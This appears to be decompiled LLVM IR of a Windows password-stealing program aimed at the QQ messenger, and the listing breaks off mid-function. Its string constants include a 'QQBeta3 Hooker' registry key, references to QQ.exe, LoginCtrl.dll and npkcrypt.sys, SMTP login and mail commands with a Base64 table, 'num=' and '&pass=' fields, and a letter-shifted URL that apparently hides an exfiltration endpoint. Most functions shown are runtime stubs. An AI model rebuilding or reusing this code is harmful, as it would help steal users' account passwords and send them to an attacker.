source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404c5c = local_unnamed_addr constant i32 43
@global_var_404c74 = constant i32 37
@global_var_404cfc = local_unnamed_addr constant i32 63
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_404dc0 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404dc4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_404de0 = constant [10 x i8] c"First Run\00"
@global_var_404e9c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404eb8 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_404f64 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f74 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405238 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4215688
@B64EncodeTable_at_405388 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a60 = constant [6 x i8] c"HELO \00"
@global_var_405a70 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a7c = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a94 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405aac = constant i32 62
@global_var_405ab8 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405acc = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405adc = constant [8 x i8] c"From: <\00"
@global_var_405aec = constant [6 x i8] c"To: <\00"
@global_var_405afc = constant [10 x i8] c"Subject: \00"
@global_var_405b10 = constant i32 46
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_405b1c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_405b66 = local_unnamed_addr constant i32 763609949
@global_var_405c88 = constant [7 x i8] c"#32770\00"
@global_var_405c98 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_405ce4 = local_unnamed_addr constant i32 4218088
@global_var_405ce8 = local_unnamed_addr constant i32 841875985
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4218380
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406008 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406320 = constant [6 x i8] c"Down(\00"
@global_var_406330 = constant i32 41
@global_var_40633c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406340 = constant [5 x i8] c"Open\00"
@global_var_4096d0 = global i32 0
@global_var_406604 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_406610 = constant i32 47
@global_var_406650 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_40665c = constant [5 x i8] c"num=\00"
@global_var_40666c = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_40667c = local_unnamed_addr constant [35 x i8] c"iuuq;00uftu=43992=dpn0uftu0ofx=btq\00"
@global_var_406754 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406764 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406874 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406884 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_40688c = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406b00 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406b14 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406b20 = local_unnamed_addr constant i32 47
@global_var_40690c = local_unnamed_addr constant i32 4221200
@global_var_406910 = local_unnamed_addr constant i32 841875985
@global_var_406c40 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406c54 = constant i32 47
@global_var_406c60 = constant [3 x i8] c"\0D\0A\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_407238 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_4072e4 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_40746c = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_407478 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_4096f0 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_407958 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_40797c = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_407a10 = constant [11 x i8] c"user32.dll\00"
@global_var_407a1c = constant [11 x i8] c"LoadImageA\00"
@global_var_407a28 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407608 = local_unnamed_addr constant i32 4224596
@global_var_407654 = local_unnamed_addr constant i32 1867011080
@global_var_407a38 = constant [12 x i8] c"LoadStringA\00"
@global_var_407a44 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_407a50 = constant [12 x i8] c"shell32.dll\00"
@global_var_407a5c = constant [14 x i8] c"ShellExecuteA\00"
@global_var_407a6c = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_40810d = local_unnamed_addr global i32 0
@global_var_4096f4 = local_unnamed_addr global i32 0
@global_var_4096f8 = local_unnamed_addr global i32 0
@global_var_4096fc = local_unnamed_addr global i32 0
@global_var_407b78 = local_unnamed_addr constant i32 32
@global_var_40980c = local_unnamed_addr global i32 0
@global_var_407f28 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_409808 = local_unnamed_addr global i32 0
@global_var_407f38 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407f50 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407f68 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407f78 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407f88 = constant [8 x i8] c"ListBox\00"
@global_var_409810 = global i32 0
@global_var_407f98 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_409700 = external global i8*

declare i32 @unknown_4e40() local_unnamed_addr

declare i32 @unknown_4f18() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

